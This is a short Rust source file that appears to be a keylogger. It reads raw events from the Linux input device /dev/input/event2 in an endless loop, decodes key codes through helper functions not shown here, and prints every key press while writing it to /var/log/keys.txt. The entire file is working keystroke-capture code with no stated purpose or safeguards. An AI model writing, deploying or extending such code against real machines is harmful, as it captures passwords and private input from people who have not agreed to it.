use std::fs::File;
use std::io::{self, Read, Write};

mod parse_input;
use parse_input::{get_input_code, get_input_type, get_key};

fn main() -> io::Result<()> {

    let mut event_file = File::open("/dev/input/event2")?;
    let mut keys_file = File::create("/var/log/keys.txt")?;

    loop {

        let mut buffer = [0u8; 72];
        let bytes_read = event_file.read(&mut buffer)?;
        let data = &buffer[..bytes_read];
        let mut builder = String::new();
        for element in data {
            builder += format!("{:02X}", element).as_str();
        } 

        let input_code = get_input_code(&builder);
        let input_type = get_input_type(&builder);
        let key = get_key(input_code);

        if (input_type == "01") || (input_type == "rpt") {
            println!("{}: {}", input_code, key);
            keys_file.write_all(key.as_bytes())?;
        }

    }
}
